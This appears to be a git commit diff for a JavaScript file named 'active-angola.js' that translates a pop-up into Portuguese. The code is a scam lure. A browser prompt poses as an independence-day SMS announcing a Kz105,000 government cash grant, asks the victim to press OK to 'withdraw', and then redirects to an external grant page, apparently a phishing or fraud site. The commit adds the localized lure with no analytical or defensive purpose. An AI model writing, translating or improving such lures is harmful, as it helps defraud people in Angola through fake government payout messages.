141c51f68ad40807f3666febe8a652c126283af5
itidnewblog4 <ukpehaitid2@gmail.com>
2025-11-04 10:06:29 +0100

    Update active-angola.js

--- active-angola.js
+++ active-angola.js
@@ -1,5 +1,5 @@
-var password = 'WITHDRAW Kz105,000'
-password=prompt('SMS: Happy Independence, you are among the selected ones to receive Kz105,000 cash grant from the government, Press Ok to withdraw cash Now ','WITHDRAW Kz105,000');
-if (password != 'WITHDRAW Kz105,000') {
+var password = 'SAQUE Kz105.000'
+password=prompt('SMS: Feliz Dia da Independência! Você está entre os selecionados para receber o auxílio emergencial de Kz105.000 do governo. Clique em "OK" para sacar o dinheiro agora. ','SAQUE Kz105.000');
+if (password != 'SAQUE Kz105.000') {
 location.href='https://phlug.org/angola-grant.html';
 }
